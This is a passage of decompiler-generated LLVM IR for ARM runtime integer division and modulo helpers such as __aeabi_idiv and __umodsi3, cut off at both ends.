  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_127b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1279cthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_12858 = udiv i32 %arg1, %arg2
  ret i32 %v2_12858
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1286c = icmp slt i32 %arg2, 0
  %v2_1286c = icmp eq i32 %arg2, 0
  %v0_12870 = load i32, i32* @r0, align 4
  %v2_12870 = xor i32 %v0_12870, %arg2
  br i1 %v2_1286c, label %dec_label_pc_12984, label %dec_label_pc_12878

dec_label_pc_12878:                               ; preds = %entry
  br i1 %v1_1286c, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_12878
  %v2_12878 = sub i32 0, %arg2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_12878, %bb
  %v1_12944 = phi i32 [ %v2_12878, %bb ], [ %arg2, %dec_label_pc_12878 ]
  %v1_1287c = add i32 %v1_12944, -1
  %v7_1287c = icmp eq i32 %v1_12944, 1
  br i1 %v7_1287c, label %dec_label_pc_12924, label %dec_label_pc_12884

dec_label_pc_12884:                               ; preds = %thread-pre-split
  %v1_12884 = icmp slt i32 %v0_12870, 0
  br i1 %v1_12884, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_12884
  %v2_12888 = sub i32 0, %v0_12870
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_12884, %bb85
  %v0_12978 = phi i32 [ %v0_12870, %dec_label_pc_12884 ], [ %v2_12888, %bb85 ]
  %v3_1288c = icmp uge i32 %v0_12978, %v1_12944
  %v9_1288c = icmp eq i32 %v0_12978, %v1_12944
  %v2_12890 = xor i1 %v3_1288c, true
  %v3_12890 = or i1 %v9_1288c, %v2_12890
  br i1 %v3_12890, label %dec_label_pc_12930, label %dec_label_pc_12894

dec_label_pc_12894:                               ; preds = %bb86
  %v2_12894 = and i32 %v1_1287c, %v1_12944
  %v4_12894 = icmp eq i32 %v2_12894, 0
  br i1 %v4_12894, label %dec_label_pc_12940, label %dec_label_pc_1289c

dec_label_pc_1289c:                               ; preds = %dec_label_pc_12894
  %v3_1289c = icmp ult i32 %v1_12944, 536870912
  br i1 %v3_1289c, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1289c
  %v4_128a0 = mul i32 %v1_12944, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1289c, %.thread
  %v0_128c0.pr40.ph = phi i32 [ %v4_128a0, %.thread ], [ %v1_12944, %dec_label_pc_1289c ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1289c ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_128c0.pr40 = phi i32 [ %v4_128b4, %bb89 ], [ %v0_128c0.pr40.ph, %.preheader.preheader ]
  %v1_128b8 = phi i32 [ %v4_128b8, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_128ac = icmp ugt i32 %v0_128c0.pr40, 268435455
  br i1 %v2_128ac, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_128c0thread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_128b0 = icmp ult i32 %v0_128c0.pr40, %v0_12978
  br i1 %v4_128b0, label %bb88, label %dec_label_pc_128c0thread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_128b4 = and i32 %v0_128c0.pr40, 268435456
  %v3_128b4 = icmp eq i32 %v2_128b4, 0
  %v4_128b4 = mul i32 %v0_128c0.pr40, 16
  br i1 %v3_128b4, label %bb89, label %dec_label_pc_128c0.loopexit

bb89:                                             ; preds = %bb88
  %v2_128b8 = and i32 %v1_128b8, 268435456
  %v3_128b8 = icmp eq i32 %v2_128b8, 0
  %v4_128b8 = mul i32 %v1_128b8, 16
  br i1 %v3_128b8, label %.preheader, label %dec_label_pc_128c0thread-pre-split.loopexit.loopexit

dec_label_pc_128c0thread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_128cc52.ph = phi i32 [ %v1_128b8, %bb87 ], [ %v4_128b8, %bb89 ]
  %v0_128c0.pr42.ph = phi i32 [ %v0_128c0.pr40, %bb87 ], [ %v4_128b4, %bb89 ]
  br label %dec_label_pc_128c0thread-pre-split.loopexit

dec_label_pc_128c0thread-pre-split.loopexit:      ; preds = %dec_label_pc_128c0thread-pre-split.loopexit.loopexit, %.thread3
  %v1_128cc52 = phi i32 [ %v1_128b8, %.thread3 ], [ %v1_128cc52.ph, %dec_label_pc_128c0thread-pre-split.loopexit.loopexit ]
  %v0_128c0.pr42 = phi i32 [ %v0_128c0.pr40, %.thread3 ], [ %v0_128c0.pr42.ph, %dec_label_pc_128c0thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_128c0thread-pre-split

dec_label_pc_128c0thread-pre-split:               ; preds = %dec_label_pc_128c0thread-pre-split.loopexit, %bb91
  %v1_128cc50 = phi i32 [ %v1_128cc52, %dec_label_pc_128c0thread-pre-split.loopexit ], [ %v3_128cc, %bb91 ]
  %v2_128c448 = phi i32 [ %v0_12978, %dec_label_pc_128c0thread-pre-split.loopexit ], [ %v2_128c4, %bb91 ]
  %v0_128c0.pr = phi i32 [ %v0_128c0.pr42, %dec_label_pc_128c0thread-pre-split.loopexit ], [ %v3_128c8, %bb91 ]
  br label %dec_label_pc_128c0

dec_label_pc_128c0.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_128c0

dec_label_pc_128c0:                               ; preds = %dec_label_pc_128c0.loopexit, %dec_label_pc_128c0thread-pre-split
  %v1_128cc = phi i32 [ %v1_128cc50, %dec_label_pc_128c0thread-pre-split ], [ %v1_128b8, %dec_label_pc_128c0.loopexit ]
  %v2_128c4 = phi i32 [ %v2_128c448, %dec_label_pc_128c0thread-pre-split ], [ %v0_12978, %dec_label_pc_128c0.loopexit ]
  %v1_128c8 = phi i32 [ %v0_128c0.pr, %dec_label_pc_128c0thread-pre-split ], [ %v4_128b4, %dec_label_pc_128c0.loopexit ]
  %v2_128c0 = icmp slt i32 %v1_128c8, 0
  br i1 %v2_128c0, label %dec_label_pc_128d4, label %bb90

bb90:                                             ; preds = %dec_label_pc_128c0
  %v4_128c4 = icmp ult i32 %v1_128c8, %v2_128c4
  br i1 %v4_128c4, label %bb91, label %dec_label_pc_128d4

bb91:                                             ; preds = %bb90
  %v3_128c8 = mul i32 %v1_128c8, 2
  %v2_128cc = icmp slt i32 %v1_128cc, 0
  %v3_128cc = mul i32 %v1_128cc, 2
  br i1 %v2_128cc, label %dec_label_pc_128d4, label %dec_label_pc_128c0thread-pre-split

dec_label_pc_128d4:                               ; preds = %bb90, %dec_label_pc_128c0, %bb91
  %v2_128e063 = phi i32 [ %v3_128cc, %bb91 ], [ %v1_128cc, %bb90 ], [ %v1_128cc, %dec_label_pc_128c0 ]
  %v1_128d855 = phi i32 [ %v3_128c8, %bb91 ], [ %v1_128c8, %bb90 ], [ %v1_128c8, %dec_label_pc_128c0 ]
  br label %dec_label_pc_128d8

dec_label_pc_128d8:                               ; preds = %.thread13, %dec_label_pc_128d4
  %v1_1290c = phi i32 [ %v4_1290c, %.thread13 ], [ %v2_128e063, %dec_label_pc_128d4 ]
  %v1_128e0 = phi i32 [ %v1_1291c, %.thread13 ], [ 0, %dec_label_pc_128d4 ]
  %v1_12910 = phi i32 [ %v4_12910, %.thread13 ], [ %v1_128d855, %dec_label_pc_128d4 ]
  %v1_128dc = phi i32 [ %v0_12908, %.thread13 ], [ %v0_12978, %dec_label_pc_128d4 ]
  %v3_128d8 = icmp ult i32 %v1_128dc, %v1_12910
  br i1 %v3_128d8, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_128d8
  %v3_128dc = sub i32 %v1_128dc, %v1_12910
  %v3_128e0 = or i32 %v1_128e0, %v1_1290c
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_128d8, %bb92
  %v1_128e8 = phi i32 [ %v1_128dc, %dec_label_pc_128d8 ], [ %v3_128dc, %bb92 ]
  %v1_128ec = phi i32 [ %v1_128e0, %dec_label_pc_128d8 ], [ %v3_128e0, %bb92 ]
  %v4_128e4 = udiv i32 %v1_12910, 2
  %v6_128e4 = icmp ult i32 %v1_128e8, %v4_128e4
  br i1 %v6_128e4, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_128e8 = urem i32 %v1_12910, 2
  %v4_128e8 = icmp eq i32 %v3_128e8, 0
  %v6_128e8 = sub i32 %v1_128e8, %v4_128e4
  br i1 %v4_128e8, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_128ec = udiv i32 %v1_1290c, 2
  %v6_128ec = or i32 %v1_128ec, %v5_128ec
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_128f4 = phi i32 [ %v6_128e8, %bb93 ], [ %v1_128e8, %.thread8 ], [ %v6_128e8, %bb94 ]
  %v1_128f8 = phi i32 [ %v1_128ec, %bb93 ], [ %v1_128ec, %.thread8 ], [ %v6_128ec, %bb94 ]
  %v4_128f0 = udiv i32 %v1_12910, 4
  %v6_128f0 = icmp ult i32 %v1_128f4, %v4_128f0
  br i1 %v6_128f0, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_128f4 = and i32 %v1_12910, 2
  %v4_128f4 = icmp eq i32 %v3_128f4, 0
  %v6_128f4 = sub i32 %v1_128f4, %v4_128f0
  br i1 %v4_128f4, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_128f8 = udiv i32 %v1_1290c, 4
  %v6_128f8 = or i32 %v1_128f8, %v5_128f8
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_12900 = phi i32 [ %v6_128f4, %bb95 ], [ %v1_128f4, %.thread9 ], [ %v6_128f4, %bb96 ]
  %v1_12904 = phi i32 [ %v1_128f8, %bb95 ], [ %v1_128f8, %.thread9 ], [ %v6_128f8, %bb96 ]
  %v4_128fc = udiv i32 %v1_12910, 8
  %v6_128fc = icmp ult i32 %v1_12900, %v4_128fc
  br i1 %v6_128fc, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_12900 = and i32 %v1_12910, 4
  %v4_12900 = icmp eq i32 %v3_12900, 0
  %v6_12900 = sub i32 %v1_12900, %v4_128fc
  br i1 %v4_12900, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_12904 = udiv i32 %v1_1290c, 8
  %v6_12904 = or i32 %v1_12904, %v5_12904
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_1291c = phi i32 [ %v1_12904, %bb97 ], [ %v1_12904, %.thread10 ], [ %v6_12904, %bb98 ]
  %v0_12908 = phi i32 [ %v6_12900, %bb97 ], [ %v1_12900, %.thread10 ], [ %v6_12900, %bb98 ]
  %v2_12908 = icmp eq i32 %v0_12908, 0
  br i1 %v2_12908, label %dec_label_pc_12918, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_1290c, 16
  br i1 %tmp, label %dec_label_pc_12918, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_1290c = udiv i32 %v1_1290c, 16
  %v4_12910 = udiv i32 %v1_12910, 16
  br label %dec_label_pc_128d8

dec_label_pc_12918:                               ; preds = %thread-pre-split12, %bb99
  %v1_12918 = icmp slt i32 %v2_12870, 0
  br i1 %v1_12918, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_12918
  %v2_1291c = sub i32 0, %v1_1291c
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_12924, %dec_label_pc_12918, %bb100
  %v1_12920 = phi i32 [ %v1_1291c, %dec_label_pc_12918 ], [ %v2_1291c, %bb100 ], [ %v0_12870, %dec_label_pc_12924 ], [ %v2_12928, %bb101 ], [ %v1_1293c80, %bb103 ], [ %v2_12938, %bb104 ]
  ret i32 %v1_12920

dec_label_pc_12924:                               ; preds = %thread-pre-split
  br i1 %v1_1286c, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_12924
  %v2_12928 = sub i32 0, %v0_12870
  br label %.thread16

dec_label_pc_12930:                               ; preds = %bb86
  br i1 %v3_1288c, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_12930
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_12930, %bb102
  %v1_1293c80 = phi i32 [ %v0_12870, %dec_label_pc_12930 ], [ 0, %bb102 ]
  br i1 %v9_1288c, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_12934 = ashr i32 %v2_12870, 31
  %v2_12938 = or i32 %v4_12934, 1
  br label %.thread16

dec_label_pc_12940:                               ; preds = %dec_label_pc_12894
  %v2_12940 = icmp ugt i32 %v1_12944, 65535
  br i1 %v2_12940, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_12940
  %v2_12944 = and i32 %v1_12944, 32768
  %v3_12944 = icmp eq i32 %v2_12944, 0
  %v4_12944 = udiv i32 %v1_12944, 65536
  br i1 %v3_12944, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_12940
  %v0_1295070 = phi i32 [ %v1_12944, %dec_label_pc_12940 ], [ %v4_12944, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_12954 = phi i32 [ %v0_1295070, %.thread19 ], [ %v4_12944, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_12950 = icmp ugt i32 %v1_12954, 255
  br i1 %v2_12950, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_12954 = and i32 %v1_12954, 128
  %v3_12954 = icmp eq i32 %v2_12954, 0
  %v4_12954 = udiv i32 %v1_12954, 256
  br i1 %v3_12954, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_12958 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_12964 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_12958, %bb108 ]
  %v1_12960 = phi i32 [ %v1_12954, %bb106 ], [ %v4_12954, %bb107 ], [ %v4_12954, %bb108 ]
  %v2_1295c = icmp ugt i32 %v1_12960, 15
  br i1 %v2_1295c, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_12960 = and i32 %v1_12960, 8
  %v3_12960 = icmp eq i32 %v2_12960, 0
  %v4_12960 = udiv i32 %v1_12960, 16
  br i1 %v3_12960, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_12964 = add nsw i32 %v1_12964, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_1296c = phi i32 [ %v1_12964, %.thread20 ], [ %v1_12964, %bb109 ], [ %v2_12964, %bb110 ]
  %v5_12970 = phi i32 [ %v1_12960, %.thread20 ], [ %v4_12960, %bb109 ], [ %v4_12960, %bb110 ]
  %v2_12968 = icmp ugt i32 %v5_12970, 3
  %v7_12968 = icmp eq i32 %v5_12970, 4
  %v2_1296c = xor i1 %v7_12968, true
  %v3_1296c = and i1 %v2_12968, %v2_1296c
  br i1 %v3_1296c, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_1296c = add nsw i32 %v4_1296c, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_12970 = phi i32 [ %v4_1296c, %.thread21 ], [ %v5_1296c, %bb111 ]
  %v2_12970 = xor i1 %v2_12968, true
  %v3_12970 = or i1 %v7_12968, %v2_12970
  br i1 %v3_12970, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_12970 = udiv i32 %v5_12970, 2
  %v9_12970 = add i32 %v4_12970, %v8_12970
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_12978 = phi i32 [ %v4_12970, %bb112 ], [ %v9_12970, %bb113 ]
  %v1_12974 = icmp slt i32 %v2_12870, 0
  %v6_12978 = lshr i32 %v0_12978, %v1_12978
  %v2_1297c = sub i32 0, %v6_12978
  %v2_1297c.v6_12978 = select i1 %v1_12974, i32 %v2_1297c, i32 %v6_12978
  ret i32 %v2_1297c.v6_12978

dec_label_pc_12984:                               ; preds = %entry
  %v0_12984 = load i32, i32* @lr, align 4
  %v0_12988 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_12984)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_12970, { 1, 0 }
  uselistorder i1 %v7_12968, { 1, 0 }
  uselistorder i32 %v4_12960, { 1, 0 }
  uselistorder i32 %v1_12960, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12954, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_12954, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12944, { 1, 0 }
  uselistorder i32 %v0_12908, { 1, 0 }
  uselistorder i32 %v4_128fc, { 1, 0 }
  uselistorder i32 %v1_12904, { 1, 2, 0 }
  uselistorder i32 %v4_128f0, { 1, 0 }
  uselistorder i32 %v1_128f8, { 1, 2, 0 }
  uselistorder i32 %v4_128e4, { 1, 0 }
  uselistorder i32 %v1_128ec, { 1, 2, 0 }
  uselistorder i32 %v1_12910, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_128e0, { 1, 0 }
  uselistorder i32 %v1_1290c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_128cc, { 1, 0 }
  uselistorder i32 %v3_128c8, { 1, 0 }
  uselistorder i32 %v1_128c8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_128c4, { 1, 0 }
  uselistorder i32 %v1_128cc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_128b8, { 1, 0 }
  uselistorder i32 %v4_128b4, { 2, 1, 0 }
  uselistorder i32 %v1_128b8, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_128c0.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_1288c, { 1, 0 }
  uselistorder i32 %v1_12944, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_12870, { 1, 0, 2 }
  uselistorder i32 %v0_12870, { 3, 2, 1, 4, 5, 6, 0 }
  uselistorder i32 %arg2, { 2, 3, 4, 0, 1 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_12918, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_128d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_128c0thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_12998 = sdiv i32 %arg1, %arg2
  ret i32 %v2_12998
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_129ac = add i32 %arg2, -1
  %v2_129ac = icmp eq i32 %arg2, 0
  br i1 %v2_129ac, label %dec_label_pc_12a68, label %dec_label_pc_129b4

dec_label_pc_129b4:                               ; preds = %entry
  %v7_129ac = icmp eq i32 %arg2, 1
  br i1 %v7_129ac, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_129b4
  %v1_129b4 = load i32, i32* @r0, align 4
  %v10_129b4 = icmp eq i32 %v1_129b4, %arg2
  br i1 %v10_129b4, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_129b4, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_129b4 = icmp ult i32 %v1_129b4, %arg2
  br i1 %v4_129b4, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_129bc = and i32 %v1_129ac, %arg2
  %v8_129bc = icmp eq i32 %v6_129bc, 0
  br i1 %v8_129bc, label %.thread67, label %dec_label_pc_129cc.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_129c0 = phi i32 [ %v1_129b4, %bb75 ], [ 0, %.thread65 ]
  %v3_129c0 = and i32 %v1_129c0, %v1_129ac
  br label %bb76

dec_label_pc_129cc.preheader:                     ; preds = %bb75
  %v2_129cc99 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_129cc99, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_12a5c, %bb74, %bb89, %bb84, %dec_label_pc_12a2c, %.thread67
  %v5_129c4 = phi i32 [ %v1_129b4, %bb74 ], [ %v3_129c0, %.thread67 ], [ %v1_12a08.v6_12a08.v6_12a10.v6_12a18, %dec_label_pc_12a2c ], [ 0, %bb84 ], [ %v1_12a60, %dec_label_pc_12a5c ], [ %v2_12a5c, %bb89 ]
  ret i32 %v5_129c4

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_129cc.preheader
  %v0_129e0.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_129cc.preheader ], [ %v4_129d4, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_129cc.preheader ], [ %v2_129d811, %.thread1.thread9 ]
  br label %dec_label_pc_129e0thread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_129cc.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_129d811, %.thread1.thread9 ], [ 0, %dec_label_pc_129cc.preheader ]
  %v0_129e0.pr33100 = phi i32 [ %v4_129d4, %.thread1.thread9 ], [ %arg2, %dec_label_pc_129cc.preheader ]
  %v4_129d0 = icmp ult i32 %v0_129e0.pr33100, %v1_129b4
  br i1 %v4_129d0, label %bb78, label %dec_label_pc_129e0thread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_129d4 = and i32 %v0_129e0.pr33100, 268435456
  %v3_129d4 = icmp eq i32 %v2_129d4, 0
  %v4_129d4 = mul i32 %v0_129e0.pr33100, 16
  br i1 %v3_129d4, label %.thread1.thread9, label %dec_label_pc_129e0.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_129d811 = add i32 %storemerge101, 4
  %v2_129cc = icmp ugt i32 %v4_129d4, 268435455
  br i1 %v2_129cc, label %.thread, label %bb77

dec_label_pc_129e0thread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_129e0thread-pre-split.loopexit

dec_label_pc_129e0thread-pre-split.loopexit:      ; preds = %dec_label_pc_129e0thread-pre-split.loopexit.loopexit, %.thread
  %v0_129e0.pr3398 = phi i32 [ %v0_129e0.pr33.lcssa, %.thread ], [ %v0_129e0.pr33100, %dec_label_pc_129e0thread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_129e0thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_129e0thread-pre-split

dec_label_pc_129e0thread-pre-split:               ; preds = %.thread4, %dec_label_pc_129e0thread-pre-split.loopexit
  %v1_129ec39 = phi i32 [ %storemerge95, %dec_label_pc_129e0thread-pre-split.loopexit ], [ %v2_129ec, %.thread4 ]
  %v0_129e0.pr = phi i32 [ %v0_129e0.pr3398, %dec_label_pc_129e0thread-pre-split.loopexit ], [ %v3_129e8, %.thread4 ]
  br label %dec_label_pc_129e0

dec_label_pc_129e0.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_129e0

dec_label_pc_129e0:                               ; preds = %dec_label_pc_129e0.loopexit, %dec_label_pc_129e0thread-pre-split
  %v0_129f4.pr = phi i32 [ %v1_129ec39, %dec_label_pc_129e0thread-pre-split ], [ %storemerge101, %dec_label_pc_129e0.loopexit ]
  %v1_129e8 = phi i32 [ %v0_129e0.pr, %dec_label_pc_129e0thread-pre-split ], [ %v4_129d4, %dec_label_pc_129e0.loopexit ]
  %v2_129e0 = icmp slt i32 %v1_129e8, 0
  br i1 %v2_129e0, label %dec_label_pc_129f4, label %bb79

bb79:                                             ; preds = %dec_label_pc_129e0
  %v4_129e4 = icmp ult i32 %v1_129e8, %v1_129b4
  br i1 %v4_129e4, label %.thread4, label %dec_label_pc_129f4

.thread4:                                         ; preds = %bb79
  %v3_129e8 = mul i32 %v1_129e8, 2
  %v2_129ec = add i32 %v0_129f4.pr, 1
  br label %dec_label_pc_129e0thread-pre-split

dec_label_pc_129f4:                               ; preds = %bb79, %dec_label_pc_129e0
  %v2_129f4 = add i32 %v0_129f4.pr, -3
  %v5_129f8 = icmp slt i32 %v0_129f4.pr, 3
  br i1 %v5_129f8, label %dec_label_pc_12a38, label %dec_label_pc_129fc

dec_label_pc_129fc:                               ; preds = %dec_label_pc_129f4, %bb83
  %v6_12a24 = phi i32 [ %v0_12a2c, %bb83 ], [ %v2_129f4, %dec_label_pc_129f4 ]
  %v1_12a00 = phi i32 [ %v1_12a08.v6_12a08.v6_12a10.v6_12a18, %bb83 ], [ %v1_129b4, %dec_label_pc_129f4 ]
  %v3_12a2012 = phi i32 [ %v3_12a20, %bb83 ], [ %v1_129e8, %dec_label_pc_129f4 ]
  %v3_129fc = icmp ult i32 %v1_12a00, %v3_12a2012
  %v3_12a00 = select i1 %v3_129fc, i32 0, i32 %v3_12a2012
  %v1_12a08 = sub i32 %v1_12a00, %v3_12a00
  %v4_12a04 = udiv i32 %v3_12a2012, 2
  %v6_12a04 = icmp ult i32 %v1_12a08, %v4_12a04
  %v6_12a08 = select i1 %v6_12a04, i32 0, i32 %v4_12a04
  %v1_12a08.v6_12a08 = sub i32 %v1_12a08, %v6_12a08
  %.demorgan = and i1 %v3_129fc, %v6_12a04
  %v4_12a0c = udiv i32 %v3_12a2012, 4
  %v6_12a0c = icmp ult i32 %v1_12a08.v6_12a08, %v4_12a0c
  %v6_12a10 = select i1 %v6_12a0c, i32 0, i32 %v4_12a0c
  %v1_12a08.v6_12a08.v6_12a10 = sub i32 %v1_12a08.v6_12a08, %v6_12a10
  %.demorgan71 = and i1 %.demorgan, %v6_12a0c
  %v4_12a14 = udiv i32 %v3_12a2012, 8
  %v6_12a14 = icmp ult i32 %v1_12a08.v6_12a08.v6_12a10, %v4_12a14
  %v6_12a18 = select i1 %v6_12a14, i32 0, i32 %v4_12a14
  %v1_12a08.v6_12a08.v6_12a10.v6_12a18 = sub i32 %v1_12a08.v6_12a08.v6_12a10, %v6_12a18
  %.demorgan72 = and i1 %.demorgan71, %v6_12a14
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_129fc
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_129fc, %bb80
  %v2_12a1c = add i32 %v1_12a08.v6_12a08.v6_12a10.v6_12a18, -1
  %v4_12a1c = sub i32 0, %v1_12a08.v6_12a08.v6_12a10.v6_12a18
  %v5_12a1c = and i32 %v1_12a08.v6_12a08.v6_12a10.v6_12a18, %v4_12a1c
  %v3_12a20 = udiv i32 %v3_12a2012, 16
  %v5_12a24 = icmp slt i32 %v1_12a08.v6_12a08.v6_12a10.v6_12a18, 1
  br i1 %v5_12a24, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_12a24 = add i32 %v6_12a24, -4
  %v9_12a24 = sub i32 3, %v6_12a24
  %v10_12a24 = and i32 %v9_12a24, %v6_12a24
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_12a2c = phi i32 [ %v6_12a24, %bb81 ], [ %v7_12a24, %bb82 ]
  %v0_12a2815.in = phi i32 [ %v2_12a1c, %bb81 ], [ %v7_12a24, %bb82 ]
  %v1_12a2814.in = phi i32 [ %v5_12a1c, %bb81 ], [ %v10_12a24, %bb82 ]
  %v1_12a2814 = icmp slt i32 %v1_12a2814.in, 0
  %v0_12a2815 = icmp slt i32 %v0_12a2815.in, 0
  %v2_12a28 = xor i1 %v0_12a2815, %v1_12a2814
  br i1 %v2_12a28, label %dec_label_pc_12a2c, label %dec_label_pc_129fc

dec_label_pc_12a2c:                               ; preds = %bb83
  %v1_12a2c = urem i32 %v0_12a2c, 4
  %v2_12a2c = icmp eq i32 %v1_12a2c, 0
  br i1 %v2_12a2c, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_12a2c
  %v3_12a30 = icmp eq i32 %v1_12a08.v6_12a08.v6_12a10.v6_12a18, 0
  br i1 %v3_12a30, label %bb76, label %dec_label_pc_12a38

dec_label_pc_12a38:                               ; preds = %bb84, %dec_label_pc_129f4
  %v0_12a4c = phi i32 [ %v3_12a20, %bb84 ], [ %v1_129e8, %dec_label_pc_129f4 ]
